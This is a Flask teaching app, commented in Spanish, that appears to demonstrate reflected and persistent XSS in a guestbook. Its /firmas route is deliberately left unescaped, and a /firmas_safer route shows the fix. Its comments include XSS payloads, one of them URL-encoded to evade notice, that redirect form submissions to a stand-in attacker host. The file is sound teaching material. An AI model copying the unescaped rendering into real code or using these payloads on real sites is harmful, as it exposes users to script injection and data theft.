# -*- coding: utf-8 -*-
"""
@author: Enrique Martín Martín
@email: emartinm@ucm.es
"""

from flask import Flask, request, redirect, url_for, render_template
import sqlite3
import os

DBPATH = 'database.db'
SQLPATH = 'database.sql'

app = Flask(__name__)


def reset_database():
    """Elimina el fichero database.db (si existe) y lo carga desde el fichero SQLPATH"""
    try:
        os.remove(DBPATH)
    except FileNotFoundError:
        pass

    with sqlite3.connect(DBPATH) as conn:
        # cur = conn.cursor()
        with open(SQLPATH, 'r', encoding='ascii') as script_file:
            script = script_file.read()
            conn.executescript(script)
            conn.commit()


##########################
# Ejemplo de XSS reflejado
# 1. Realizar una consulta a /firmas donde el parámetro 'desde' tenga código JavaScript:
#    http://localhost:5000/firmas?desde=2020<script>alert("XSS reflejado")</script>
# 1b. Misma idea pero el script modifica el DOM cambiando la dirección del formulario con este código:
#       <script type="text/javascript">
#         window.onload = function() {
#           document.getElementById('formulario_firma').action = "https://www.atacante.com/"
#         }
#       </script>
#    http://localhost:5000/firmas?desde=2020<script type="text/javascript">window.onload = function() { document.getElementById('formulario_firma').action = "https://www.atacante.com/"} </script>
#
# 1c. Lo mismo que 1b pero codificado para que sea menos sospechoso
#    http://localhost:5000/firmas?desde=2020%3c%73%63%72%69%70%74%20%74%79%70%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%27%66%6f%72%6d%75%6c%61%72%69%6f%5f%66%69%72%6d%61%27%29%2e%61%63%74%69%6f%6e%20%3d%20%22%68%74%74%70%73%3a%2f%2f%77%77%77%2e%61%74%61%63%61%6e%74%65%2e%63%6f%6d%2f%22%7d%20%3c%2f%73%63%72%69%70%74%3e
#
#
# Ejemplo de XSS persistente
# (YA EXISTE UN XSS PERSISTENTE EN EL MENSAJE CON FECHA '2005-12-22')
# 1. Insertar una firma conteniendo código JavaScript (por ejemplo "No me gusta <script>alert("Peligro")</script>")
# 2. Visualizar las firmas


PAGINA = """
<!DOCTYPE html>
<html lang="es">
<head>
    <title>Libro de visitas</title>
</head>
<body>
  <h1>Mostrando las firmas desde la fecha "{}"</h1>
  <ul>
{}
  </ul>
  
  <br/>
  <form id="formulario_firma" action="http://localhost:5000/inserta_firma" method="post">
    <input type="text" name="firma" value="Escribe tu firma aqui">
    <input type="submit" value="Enviar">
  </form> 
</body>
</html>
"""


@app.route('/firmas', methods=['GET'])
def firmas():
    """Muestra las firmas añadidas desde una fecha dada en el parámetro HTML 'desde'"""
    desde = request.args.get('desde', '2020')
    query = f"""SELECT texto, fecha 
                FROM firmas 
                WHERE fecha >= :desde
                ORDER BY fecha DESC, id DESC"""

    conn = sqlite3.connect('database.db')
    cur = conn.cursor()
    cur.execute(query, {'desde': desde})  # Para mitigar inyección SQL
    results = cur.fetchall()
    conn.close()

    firmas_html = ""
    for result in results:
        firmas_html += f"    <li>{result[0]}. {result[1]}</li>\n"

    return PAGINA.format(desde, firmas_html)


@app.route('/firmas_safer', methods=['GET'])
def firmas_safer():
    """Muestra las firmas añadidas desde una fecha dada en el parámetro HTML 'desde'
       Versión más segura porque usa plantillas que escapan HTML
    """
    desde = request.args.get('desde', '2020')  # Habría que validar/limpiar esta entrada
    query = f"""SELECT texto, fecha 
                FROM firmas 
                WHERE fecha >= :desde
                ORDER BY fecha DESC, id DESC"""

    conn = sqlite3.connect('database.db')
    cur = conn.cursor()
    cur.execute(query, {'desde': desde})  # Para mitigar inyección SQL
    results = cur.fetchall()
    conn.close()

    return render_template('firmas.html', desde=desde, firmas=results)


@app.route('/inserta_firma', methods=['POST'])
def inserta_firma():
    """Inserta una firma con la fecha actual y el id auto-incremental"""
    texto = request.form.get('firma')
    # Como segunda línea de defensa, sería imprescindible *también* validar/limpiar la entrada "firma"
    query = f"INSERT INTO firmas(texto) VALUES (:texto)"
    try:
        with sqlite3.connect("database.db") as conn:
            conn.execute(query, {'texto': texto})  # Para mitigar inyección SQL
            conn.commit()
        return redirect(url_for('firmas'))
    except Exception as e:
        print(e)
        return "Error al insertar la firma"


if __name__ == '__main__':
    # Activa el depurador y recarga automáticamente
    app.config['ENV'] = 'development'
    app.config['DEBUG'] = True
    app.config['TEST'] = True

    # Imprescindible para usar sesiones
    app.config['SECRET_KEY'] = 'giw_clave_secreta'

    app.config['STATIC_FOLDER'] = 'static'
    app.config['TEMPLATES_FOLDER'] = 'templates'

    app.run()
